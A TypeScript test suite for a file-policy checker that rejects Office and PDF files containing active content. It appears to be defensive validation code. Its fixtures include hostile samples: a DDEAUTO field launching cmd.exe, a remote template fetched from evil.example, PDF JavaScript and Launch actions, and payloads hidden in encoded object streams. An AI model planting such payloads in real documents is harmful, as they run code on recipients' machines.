import assert from 'node:assert/strict'
import { deflateSync } from 'node:zlib'
import { test } from 'node:test'
import { zip } from '../../../testing/office-fixtures.ts'
import { ARTIFACT_LIMITS, artifactFormat, checkArtifactContent, checkArtifactName, displayArtifactName, isTextArtifactType } from './artifact-file-policy.ts'

// 执行隔离 2b-2：output 中的文件按格式、文件头与活动内容检查；无法完整检查即不合规。

const contentTypes = '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"></Types>'
const hyperlinkRels = '<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com" TargetMode="External"/></Relationships>'

function docx(extra: Record<string, string | Buffer> = {}, body = '<w:document><w:body><w:p><w:r><w:t>周报</w:t></w:r></w:p></w:body></w:document>') {
  return zip({ '[Content_Types].xml': contentTypes, 'word/document.xml': body, 'word/_rels/document.xml.rels': hyperlinkRels, ...extra })
}
const xlsx = (extra: Record<string, string | Buffer> = {}) => zip({ '[Content_Types].xml': contentTypes, 'xl/workbook.xml': '<workbook/>', ...extra })
const pptx = (extra: Record<string, string | Buffer> = {}) => zip({ '[Content_Types].xml': contentTypes, 'ppt/presentation.xml': '<p:presentation/>', ...extra })

function pdf(body: string): Buffer {
  return Buffer.from(`%PDF-1.7\n${body}\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n`, 'latin1')
}
function objectStream(content: string, filters = '/FlateDecode', encode: (data: Buffer) => Buffer = deflateSync): string {
  const data = encode(Buffer.from(content, 'latin1')).toString('latin1')
  return `5 0 obj\n<< /Type /ObjStm /N 1 /First 4 /Filter ${filters} /Length ${data.length} >>\nstream\n${data}\nendstream\nendobj`
}

test('formats: text, Office, PDF and images map to fixed types; everything else is unsupported', () => {
  for (const [name, type] of [['a.md', 'markdown'], ['a.txt', 'text'], ['a.CSV', 'csv'], ['a.htm', 'html'], ['a.xlsx', 'xlsx'], ['a.docx', 'docx'],
    ['a.pptx', 'pptx'], ['a.pdf', 'pdf'], ['a.png', 'png'], ['a.jpg', 'jpg'], ['a.jpeg', 'jpg']] as const) {
    assert.equal(artifactFormat(name)?.type, type, name)
  }
  for (const name of ['a.svg', 'a.doc', 'a.xls', 'a.xlsm', 'a.docm', 'a.exe', 'a.zip', 'noextension']) assert.equal(checkArtifactName(name), 'unsupported_format', name)
  assert.equal(checkArtifactName('.hidden.md'), 'hidden_file')
  assert.equal(checkArtifactName('bad\u0007name.md'), 'invalid_name')
  assert.equal(checkArtifactName(`${'很'.repeat(80)}.md`), 'invalid_name')
  assert.equal(checkArtifactName('报告.xlsx'), null)
  assert.equal(isTextArtifactType('csv'), true)
  assert.equal(isTextArtifactType('pdf'), false)
  assert.equal(displayArtifactName('a\u0000b\u001bc.md'), 'abc.md')
  assert.ok(displayArtifactName('x'.repeat(500)).length <= 120)
})

test('valid files of each format pass; size and emptiness are checked', () => {
  assert.equal(checkArtifactContent('a.docx', docx()), null)
  assert.equal(checkArtifactContent('a.xlsx', xlsx()), null)
  assert.equal(checkArtifactContent('a.pptx', pptx()), null)
  assert.equal(checkArtifactContent('a.pdf', pdf('1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj')), null)
  assert.equal(checkArtifactContent('a.png', Buffer.from('89504e470d0a1a0a0000', 'hex')), null)
  assert.equal(checkArtifactContent('a.jpg', Buffer.from('ffd8ffe000104a464946', 'hex')), null)
  assert.equal(checkArtifactContent('a.md', Buffer.from('# 标题\n')), null)
  assert.equal(checkArtifactContent('a.md', Buffer.alloc(0)), 'empty_file')
  assert.equal(checkArtifactContent('a.txt', Buffer.alloc(ARTIFACT_LIMITS.maxFileBytes + 1, 0x61)), 'too_large')
})

test('the header must match the extension', () => {
  assert.equal(checkArtifactContent('a.pdf', Buffer.from('89504e470d0a1a0a', 'hex')), 'content_mismatch')
  assert.equal(checkArtifactContent('a.png', Buffer.from('ffd8ffe0', 'hex')), 'content_mismatch')
  assert.equal(checkArtifactContent('a.docx', Buffer.from('%PDF-1.7')), 'content_mismatch')
  assert.equal(checkArtifactContent('a.xlsx', docx()), 'content_mismatch', 'a Word package named .xlsx')
  // An encrypted Office file is a compound file, not a ZIP.
  assert.equal(checkArtifactContent('a.docx', Buffer.from('d0cf11e0a1b11ae1', 'hex')), 'content_mismatch')
})

test('OOXML: macros, ActiveX, OLE, data connections and remote relationships are refused; hyperlinks are fine', () => {
  assert.equal(checkArtifactContent('a.xlsx', xlsx({ 'xl/vbaProject.bin': 'x' })), 'active_content')
  assert.equal(checkArtifactContent('a.xlsx', xlsx({ 'xl/VBAProject.bin': 'x' })), 'active_content', 'part names are case-insensitive')
  assert.equal(checkArtifactContent('a.docx', zip({ '[Content_Types].xml': '<Types><Override ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>', 'word/document.xml': '<w:document/>' })), 'active_content')
  assert.equal(checkArtifactContent('a.docx', docx({ 'word/activeX/activeX1.xml': '<ax/>' })), 'active_content')
  assert.equal(checkArtifactContent('a.docx', docx({ 'word/embeddings/oleObject1.bin': 'x' })), 'active_content')
  assert.equal(checkArtifactContent('a.xlsx', xlsx({ 'xl/connections.xml': '<connections/>' })), 'active_content')
  assert.equal(checkArtifactContent('a.xlsx', xlsx({ 'xl/externalLinks/externalLink1.xml': '<externalLink/>' })), 'active_content')
  const template = '<Relationships><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" TargetMode="External" Target="https://evil.example/t.dotm"/></Relationships>'
  assert.equal(checkArtifactContent('a.docx', docx({ 'word/_rels/settings.xml.rels': template })), 'active_content')
  assert.equal(checkArtifactContent('a.docx', docx()), null, 'an external hyperlink relationship is allowed')
})

test('OOXML: Word fields that run DDE or pull content are refused, even split across runs', () => {
  const field = (instructions: string[]) => `<w:document><w:body><w:p>${instructions.map(text => `<w:r><w:instrText xml:space="preserve">${text}</w:instrText></w:r>`).join('')}</w:p></w:body></w:document>`
  assert.equal(checkArtifactContent('a.docx', docx({}, field([' DDEAUTO c:\\\\windows\\\\cmd.exe "/k calc"']))), 'active_content')
  assert.equal(checkArtifactContent('a.docx', docx({}, field([' DD', 'E cmd "x"']))), 'active_content')
  assert.equal(checkArtifactContent('a.docx', docx({}, '<w:document><w:fldSimple w:instr=" INCLUDEPICTURE &quot;https://x/y.png&quot;"/></w:document>')), 'active_content')
  assert.equal(checkArtifactContent('a.docx', docx({}, field([' PAGE ']))), null, 'ordinary fields are fine')
})

test('OOXML: an embedded workbook (charts) is allowed but checked one level deep; broken packages are not checkable', () => {
  assert.equal(checkArtifactContent('a.pptx', pptx({ 'ppt/embeddings/Microsoft_Excel_Worksheet.xlsx': xlsx() })), null)
  assert.equal(checkArtifactContent('a.pptx', pptx({ 'ppt/embeddings/Microsoft_Excel_Worksheet.xlsx': xlsx({ 'xl/vbaProject.bin': 'x' }) })), 'active_content')
  assert.equal(checkArtifactContent('a.pptx', pptx({ 'ppt/embeddings/inner.xlsx': Buffer.from('not a zip') })), 'unverifiable')
  assert.equal(checkArtifactContent('a.docx', zip({ '[Content_Types].xml': contentTypes, 'word/document.xml': '<a/>', 'WORD/document.xml': '<b/>' })), 'unverifiable', 'case-variant duplicate parts')
  const truncated = docx().subarray(0, 60)
  assert.equal(checkArtifactContent('a.docx', truncated), 'unverifiable')
})

test('PDF: scripts, launch actions and embedded files are refused, including escaped names and object streams', () => {
  assert.equal(checkArtifactContent('a.pdf', pdf('1 0 obj\n<< /Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>\nendobj')), 'active_content')
  assert.equal(checkArtifactContent('a.pdf', pdf('1 0 obj\n<< /Type /Catalog /OpenAction << /S /J#61vaScript /JS (x) >> >>\nendobj')), 'active_content')
  assert.equal(checkArtifactContent('a.pdf', pdf('1 0 obj\n<< /S /Launch /F (calc.exe) >>\nendobj')), 'active_content')
  assert.equal(checkArtifactContent('a.pdf', pdf('1 0 obj\n<< /Names << /EmbeddedFiles 3 0 R >> >>\nendobj')), 'active_content')
  assert.equal(checkArtifactContent('a.pdf', pdf(objectStream('6 0 << /S /JavaScript /JS 7 0 R >>'))), 'active_content', 'hidden in a compressed object stream')
  assert.equal(checkArtifactContent('a.pdf', pdf(objectStream('6 0 << /S /Launch >>', '[/ASCII85Decode /FlateDecode]', data => Buffer.from(`${ascii85(deflateSync(data))}~>`, 'latin1')))), 'active_content')
  assert.equal(checkArtifactContent('a.pdf', pdf('1 0 obj\n<< /URI (https://example.com) /S /URI >>\nendobj')), null, 'links are fine')
})

test('PDF: undecodable object streams and encryption are not checkable; binary payloads do not trigger false matches', () => {
  assert.equal(checkArtifactContent('a.pdf', pdf(objectStream('x', '/FlateDecode', data => data))), 'unverifiable', 'claims Flate but is not')
  assert.equal(checkArtifactContent('a.pdf', pdf(objectStream('x', '/LZWDecode', data => data))), 'unverifiable')
  assert.equal(checkArtifactContent('a.pdf', pdf('1 0 obj\n<< /Filter /Standard /V 2 >>\nendobj\ntrailer << /Encrypt 1 0 R >>')), 'unverifiable')
  // Image and content stream bytes cannot declare actions; "/JS" inside them is not a match.
  const image = '4 0 obj\n<< /Type /XObject /Subtype /Image /Filter /DCTDecode /Length 8 >>\nstream\n\xff\xd8/JS (\nendstream\nendobj'
  const content = '3 0 obj\n<< /Length 20 >>\nstream\nBT /JS 12 Tf (x) Tj ET\nendstream\nendobj'
  assert.equal(checkArtifactContent('a.pdf', pdf(`${image}\n${content}`)), null)
})

function ascii85(data: Buffer): string {
  let out = ''
  for (let index = 0; index < data.length; index += 4) {
    const chunk = Buffer.concat([data.subarray(index, index + 4), Buffer.alloc(4)]).subarray(0, 4)
    let value = chunk.readUInt32BE(0)
    const digits: string[] = []
    for (let position = 0; position < 5; position += 1) { digits.unshift(String.fromCharCode(33 + (value % 85))); value = Math.floor(value / 85) }
    out += digits.join('').slice(0, Math.min(4, data.length - index) + 1)
  }
  return out
}
